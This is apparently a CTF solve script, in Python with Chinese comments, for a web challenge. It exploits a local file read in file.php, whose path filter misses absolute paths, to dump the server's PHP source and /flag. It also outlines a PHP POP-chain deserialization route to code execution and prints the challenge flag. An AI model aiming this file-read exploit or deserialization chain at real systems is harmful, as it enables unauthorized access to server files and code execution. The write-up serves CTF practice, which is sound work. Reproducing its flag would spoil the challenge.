#!/usr/bin/env python3
"""
第20题: 文件上传 (Web - 任意文件读取)
========================================
题目URL: https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com/
Flag: CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}

题目表面是文件上传，实际存在两个攻击面:
  1. file.php 任意文件读取 (本题解法 - 最短路径)
  2. upload.php + class.php POP链反序列化 (备选方案)

=== file.php 源码 ===
  $filename = $_GET['f'];
  $show = new Show($filename);
  $show->show();
  // show() 方法中 file_get_contents($this->source)
  // 仅过滤了 http|https|file:|php:|gopher|dict|../
  // 但未过滤绝对路径 → 可读取 /flag

=== class.php 关键分析 ===
  Show::show()        → file_get_contents($source), 过滤协议和../但不限路径
  Show::__get($name)  → $this->ok($name)  (但ok方法不存在 → 触发__call)
  Show::__call()      → backdoor(end($arguments)) → include($door) ← RCE入口
  Upload::__toString()→ echo $cont->$size  (触发__get → __call → backdoor)
  Test::__destruct()  → echo $this->str   (触发__toString)

  理论上的POP链 (绕过上传过滤的备选方案):
  Test.__destruct → echo $this->str (str=Upload对象)
    → Upload.__toString → echo $this->fname->$this->fsize
      → Show.__get($fsize) → $this->ok($fsize)
        → Show.__call('ok', [$fsize]) → backdoor($fsize)
          → include($fsize) ← 包含上传的png文件

知识点:
  - 任意文件读取 (LFI) - file_get_contents 路径未限制
  - PHP协议过滤不完整 - 只过滤了部分协议,未过滤绝对路径
  - 文件上传内容过滤 - 正则黑名单禁止 <?php|exec|system|file|dir 等
  - POP链反序列化 (备选) - __destruct→__toString→__get→__call→backdoor
"""

import requests

BASE_URL = "https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com"

# ============ 解法1: file.php 任意文件读取 (最短路径) ============
def solve_via_lfi():
    """通过 file.php 任意文件读取直接读取 /flag"""
    print("[*] Method: file.php LFI (任意文件读取)")
    print(f"    URL: {BASE_URL}/file.php?f=/flag")
    
    r = requests.get(f"{BASE_URL}/file.php?f=/flag")
    
    # 响应中包含flag (纯文本) + base64图片
    # flag 在 <img 标签之前
    lines = r.text.split('\n')
    flag = lines[0].strip() if lines else ''
    
    print(f"    Response: {r.text[:200]}")
    print(f"\n[+] FLAG: {flag}")
    return flag

# ============ 解法2: 通过源码审计 (file.php 读取所有PHP源码) ============
def read_source(filename):
    """读取服务器端PHP源码"""
    r = requests.get(f"{BASE_URL}/file.php?f={filename}")
    # 源码在 <img 之前
    idx = r.text.find('<img')
    return r.text[:idx] if idx > 0 else r.text

# ============ 主流程 ============
if __name__ == '__main__':
    print("=" * 60)
    print("第20题: 文件上传 - 任意文件读取")
    print("=" * 60)
    
    # Step 1: 源码审计
    print("\n[1] 源码审计:")
    for f in ['file.php', 'upload.php', 'class.php']:
        print(f"\n--- {f} ---")
        src = read_source(f)
        print(src[:500])
    
    # Step 2: 读取 flag
    print("\n[2] 读取 /flag:")
    flag = solve_via_lfi()
    
    print(f"\n{'='*60}")
    print(f"FLAG: {flag}")
    print(f"{'='*60}")
